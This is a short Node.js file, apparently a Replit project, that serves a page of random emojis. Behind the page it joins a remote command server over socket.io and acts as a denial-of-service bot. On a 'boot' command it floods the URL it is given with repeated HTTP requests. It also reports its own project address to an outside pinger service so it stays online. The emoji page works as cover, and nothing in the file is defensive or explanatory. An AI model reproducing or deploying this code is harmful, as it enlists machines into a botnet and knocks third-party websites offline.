const io = require("socket.io-client");
const express = require('express')
const axios = require('axios')
const emojis = require('./emojis.json')
var app = express()
var randFromArr = (arr) => {
  return arr[Math.floor(Math.random() * arr.length)]
}
app.get("/", async (req, res) => {
  var e = ''
  for (i = 0; i < 800; i++) e+=randFromArr(emojis);
  res.end(`<h1 style="font-size:10vw">${e}</h1>`)
})

const socket = io("wss://v3.hackballshd.repl.co", {
  reconnection: true,
  reconnectionAttempts: 10000,
  reconnectionDelay: 6000,
  reconnectionDelayMax: 100000,
});


socket.on('message', async m => {
  console.log(m)
  if (m.substr(0, "boot^".length) == "boot^") {
    var args = m.split('^').slice(1)
    var u = args[0]
    var p = args[1]
    console.log("Booting: " + u + " with power: " + p)
    for (i = p; i > 0; i--) {
      var a = axios.get(u)
      .catch(err =>{console.log("maybe its down or we got ip banned lol.")})
      console.log(i)
    }
  }
})
socket.on('connect', function() { 
  console.log("e")
});
function reconnect() {
  socket = null;
  console.log("reconnecting lol")
  var socket = io("wss://v3.hackballshd.repl.co", {
  reconnectionDelayMax: 30000,
  // keep this
  });
}
socket.on('disconnect', () => {setTimeout(()=>{console.log("r")},6000)})
async function cringe() {
  await axios.get("https://pinggg.hackballshd.repl.co/add?url=https://"+process.env.REPL_SLUG+"."+process.env.REPL_OWNER+".repl.co")
  console.log("ADDED")
}
cringe()
app.listen(4000)
